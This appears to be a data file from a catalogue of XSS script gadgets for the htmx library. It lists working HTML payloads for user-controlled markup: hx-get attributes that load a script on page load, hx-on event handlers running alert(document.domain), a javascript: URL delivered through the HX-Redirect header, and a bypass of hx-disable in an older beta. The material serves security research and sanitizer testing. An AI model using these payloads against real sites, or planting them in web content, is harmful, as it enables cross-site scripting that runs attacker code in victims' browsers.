---
description: htmx allows you to access [AJAX](https://htmx.org/docs/#ajax), [CSS Transitions](https://htmx.org/docs/#css), [WebSockets](https://htmx.org/docs/#websockets) and [Server Sent Events](https://htmx.org/extensions/sse/) directly in HTML, using attributes, so you can build modern user interfaces with the simplicity and power of hypertext.
github: bigskysoftware/htmx
gadgets:
  Latest (1):
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - custom-attr
      - before-lib-load
      - before-func-call
      - func-call-parameter
    pocs:
      - description: |
          The [htmx](https://github.com/bigskysoftware/htmx) library allows to perform HTTP requests and update the DOM using attributes. The following ones can be used to update the HTTP request `method`:
          - [data-hx-get](https://htmx.org/attributes/hx-get/)
          - [data-hx-post](https://htmx.org/attributes/hx-post/)
          - [data-hx-put](https://htmx.org/attributes/hx-put/)
          - [data-hx-delete](https://htmx.org/attributes/hx-delete/)
          - [data-hx-patch](https://htmx.org/attributes/hx-patch/)

          By default, it then inserts the response into the DOM using `.innerHTML` (no matter the response `Content-Type`) which is the default [hx-swap](https://htmx.org/attributes/hx-swap/) (`data-hx-swap`) value.

          There is many other attributes that can be used with it:
          - [data-hx-headers](https://htmx.org/attributes/hx-headers/)
          - [data-hx-target](https://htmx.org/attributes/hx-target/)
          - [data-hx-trigger](https://htmx.org/attributes/hx-trigger/)
          - ...

          *The full list can be found [here](https://htmx.org/reference/).*
        code: |
          <script src="https://cdn.jsdelivr.net/npm/htmx.org@2.0.6/dist/htmx.min.js"></script>

          <!-- user input -->
          <div data-hx-get="[current-location]/assets/xss/index.js" data-hx-trigger="load">Click Me</div>
      - description: All the `data-*` attributes can be replaced with their `hx-` equivalent.
        code: |
          <script src="https://cdn.jsdelivr.net/npm/htmx.org@2.0.6/dist/htmx.min.js"></script>

          <!-- user input -->
          <div hx-get="[current-location]/assets/xss/index.js" hx-trigger="load"></div>
      - description: |
          By default, htmlx only parse `data-*`, and `hx-*` attributes when the library is loaded. The only way to parse them with "delay" is using:
          - [htmx.process](https://htmx.org/api/#process): reload the targeted element or the full document if none provided.
          - [htmx.swap](https://htmx.org/api/#swap): parse and insert HTML into the DOM.
        code: |
          <script src="https://cdn.jsdelivr.net/npm/htmx.org@2.0.6/dist/htmx.min.js"></script>

          <script>
            setTimeout(function () {
              document.body.innerHTML = `<div hx-get="[current-location]/assets/xss/index.js" hx-trigger="load"></div>`;
              htmx.process(document.body);
            }, 1000);

            setTimeout(function () {
              htmx.swap(document.body, `<div hx-get="[current-location]/assets/xss/index.js" hx-trigger="load"></div>`, "innerHTML");
            }, 2000);
          </script>
    links:
      - https://htmx.org/docs/
      - https://htmx.org/reference/
  Latest (2):
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - custom-attr
      - unsafe-eval-csp
      - before-lib-load
      - before-func-call
      - func-call-parameter
    pocs:
      - description: |
          The htmlx library uses `data-hx-*` attributes to define events.

          *Check [#Latest (1)](#Latest%20(1)) to see how could this be exploited after the library is loaded.*
        code: |
          <script nonce="secret" src="https://unpkg.com/htmx.org@2.0.6"></script>

          <!-- user input -->
          <img src="x" data-hx-on-error="alert(document.domain)">
      - description: It is also possible to use `data-hx:` prefix.
        code: |
          <script nonce="secret" src="https://unpkg.com/htmx.org@2.0.6"></script>

          <!-- user input -->
          <div data-hx-on:click="alert(document.domain)">Click Me</div>
      - description: Or even with the `hx-` prefix.
        code: |
          <script nonce="secret" src="https://unpkg.com/htmx.org@2.0.6"></script>

          <!-- user input -->
          <img src="x" hx-on-error="alert(document.domain)">
    links:
      - https://htmx.org/attributes/hx-on/
  Latest (3):
    authors:
      - twitter:avlidienbrunn
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - custom-attr
      - unsafe-eval-csp
      - before-lib-load
      - before-func-call
      - func-call-parameter
    pocs:
      - description: |
          The `HX-Redirect` response header can be used to specify a URL to redirect to. Setting it to `javascript:alert(1)` triggers an XSS.

          *Check [#Latest (1)](#Latest%20(1)) to see how could this be exploited after the library is loaded.*
        code: |
          <div hx-get="/endpoint-with-HX-Redirect-header" hx-trigger="load"></div>
        preview: false
    links:
      - https://htmx.org/headers/hx-redirect/
      - https://blog.criticalthinkingpodcast.io/p/0-days-htmx-ss-with-mathias
  ≤2.0.0-beta3:
    authors:
      - twitter:avlidienbrunn
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - custom-attr
      - unsafe-eval-csp
      - before-lib-load
      - before-func-call
      - func-call-parameter
    pocs:
      - description: |
          It was possible to bypass the `hx-disable` context using `hx-on-*` attributes.

          *Check [#Latest (1)](#Latest%20(1)) to see how could this be exploited after the library is loaded.*
        code: |
          <script nonce="secret" src="https://unpkg.com/htmx.org@2.0.0-beta3"></script>

          <div hx-disable>
            <!-- user input -->
            <img src="x" data-hx-on-error="alert(document.domain)">
          </div>
    links:
      - https://htmx.org/attributes/hx-disable/
      - https://blog.criticalthinkingpodcast.io/p/0-days-htmx-ss-with-mathias
---
